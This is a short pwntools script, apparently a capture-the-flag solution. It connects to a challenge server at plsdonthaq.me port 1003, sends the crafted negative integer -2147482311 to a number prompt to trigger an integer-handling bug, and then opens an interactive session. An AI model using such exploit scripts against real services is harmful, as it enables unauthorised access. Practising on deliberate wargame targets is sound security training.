from pwn import *

r = remote('plsdonthaq.me', 1003)
r.recvuntil("Enter a number:")
r.sendline("-2147482311")
r.interactive()